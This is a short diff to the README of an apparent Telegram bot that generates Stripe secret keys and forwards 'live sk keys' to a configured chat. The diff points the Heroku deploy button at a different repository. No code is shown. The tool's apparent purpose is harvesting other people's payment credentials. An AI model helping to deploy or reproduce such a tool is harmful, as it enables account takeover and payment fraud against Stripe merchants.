@@ -8,4 +8,4 @@ FORWARD_ID - Your UserID/Chat ID to forward live sk keys to
 </br>
 BOT_TOKEN - Bot token, get it from @BotFather.
 
-[![Deploy To Heroku](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/iam-NVN/stripekey-generator)
+[![Deploy To Heroku](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/elaliaslocoxd/s)
